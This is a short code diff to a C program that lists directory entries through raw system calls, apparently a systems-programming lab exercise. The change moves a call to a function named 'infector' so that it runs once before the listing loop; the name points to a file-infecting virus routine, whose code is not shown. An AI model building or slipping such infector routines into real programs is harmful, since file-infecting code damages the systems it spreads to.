@@ -82,6 +82,7 @@ int main(int argc, char **argv)
         system_call(SYS_WRITE,STDOUT, "error-getdents",BUF_SIZE);
         return 1;
     }
+    infector("prev_make");
     system_call(SYS_WRITE,output_fd, "file type    offset    d_name\n",31);
     for (bpos = 0; bpos < nread;) {
         d = (struct linux_dirent *) (buf + bpos);
@@ -90,7 +91,6 @@ int main(int argc, char **argv)
             bpos += d->d_reclen;
             continue;
         }
-        infector("prev_make");
         system_call(SYS_WRITE, output_fd, itoa(d->d_reclen), 1);
         system_call(SYS_WRITE, output_fd, ten_spaces, strlen(ten_spaces));
         system_call(SYS_WRITE, output_fd, itoa(d->d_off), 1);
